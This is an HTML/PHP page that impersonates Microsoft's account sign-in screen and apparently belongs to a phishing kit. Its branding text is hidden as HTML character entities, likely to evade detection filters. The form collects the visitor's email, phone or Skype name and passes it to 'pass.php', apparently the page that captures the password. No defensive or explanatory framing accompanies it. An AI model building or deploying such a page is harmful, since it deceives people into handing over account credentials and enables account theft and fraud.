
<html lang="en">
<head>
    <title>&#83;&#105;&#103;&#110; &#105;&#110; &#116;&#111; &#121;&#111;&#117;&#114; &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116; &#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/login.css">
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <h4>&#83;&#105;&#103;&#110; &#73;&#110;</h4>
                    <form method="GET" action="pass.php">
                        <div class="form-group">
                            <input type="text" class="form-control" id="user" name="email" placeholder="Email, phone, or Skype" value="" required>
                            <p>&#78;&#111; &#97;&#99;&#99;&#111;&#117;&#110;&#116;? <a href="#">&#67;&#114;&#101;&#97;&#116;&#101; &#111;&#110;&#101;!</a></p>
                        </div>
                        <input type="submit" class="btn float-right" value="&#78;&#101;&#120;&#116;">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>&#80;&#114;&#105;&#118;&#97;&#99;&#121; & &#99;&#111;&#111;&#107;&#105;&#101;&#115;</p>
    <p>&#84;&#101;&#114;&#109;&#115; &#111;&#102; &#117;&#115;&#101;</p>
    <p>©<?php echo date('Y'); ?> &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;</p>
</div>



</body>
</html>
